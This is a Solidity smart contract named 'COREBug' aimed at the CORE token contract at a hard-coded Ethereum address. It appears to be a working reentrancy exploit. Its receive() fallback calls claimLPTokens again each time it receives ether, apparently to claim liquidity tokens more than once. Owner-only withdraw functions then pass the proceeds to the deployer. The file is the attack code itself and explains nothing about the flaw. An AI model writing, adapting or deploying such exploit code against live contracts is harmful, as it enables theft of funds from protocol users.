pragma solidity 0.7.1;

import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Router02.sol";

interface ERC20 {
    function totalSupply() external view returns (uint supply);
    function balanceOf(address _owner) external view returns (uint balance);
    function transfer(address _to, uint _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint _value) external returns (bool success);
    function approve(address _spender, uint _value) external returns (bool success);
    function allowance(address _owner, address _spender) external view returns (uint remaining);
    function decimals() external view returns(uint digits);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}

interface CORE {
    function claimLPTokens() external;
    function addLiquidity(bool agreesToTermsOutlinedInLiquidityGenerationParticipationAgreement) external payable;
}

contract COREBug {
    address public owner;
    address private constant CORE_ADDRESS = 0x62359Ed7505Efc61FF1D56fEF82158CcaffA23D7;
    CORE public core;

    // event for EVM logging
    event OwnerSet(address indexed oldOwner, address indexed newOwner);

    // modifier to check if caller is owner
    modifier isOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

    constructor() {
        owner = msg.sender; // 'msg.sender' is sender of current call, contract deployer for a constructor
        emit OwnerSet(address(0), owner);
        core = CORE(CORE_ADDRESS);
    }

    function callClaimLPTokens() public {
        core.claimLPTokens();
    }

    function addLiquidityToCore() public payable {
        core.addLiquidity { value:msg.value } (true);
    }

    receive() payable external {
        ERC20 token = ERC20(CORE_ADDRESS);
        if (token.balanceOf(address(this)) < 999999999999999999999999999) {
            callClaimLPTokens();
        }
    }

    function withdrawTokens(address token_address, uint256 amount) public isOwner {
        ERC20 token = ERC20(token_address);
        require(token.balanceOf(address(this)) > 0);
        token.transfer(msg.sender, amount);
    }

    function withdrawEther(uint256 amount) public isOwner {
        require(address(this).balance >= amount);
        msg.sender.transfer(amount);
    }

    function withdrawAllEther() public isOwner {
        require(address(this).balance > 0);
        msg.sender.transfer(address(this).balance);
    }

    function changeOwner(address newOwner) public isOwner {
        emit OwnerSet(owner, newOwner);
        owner = newOwner;
    }

    function getOwner() external view returns (address) {
        return owner;
    }
}

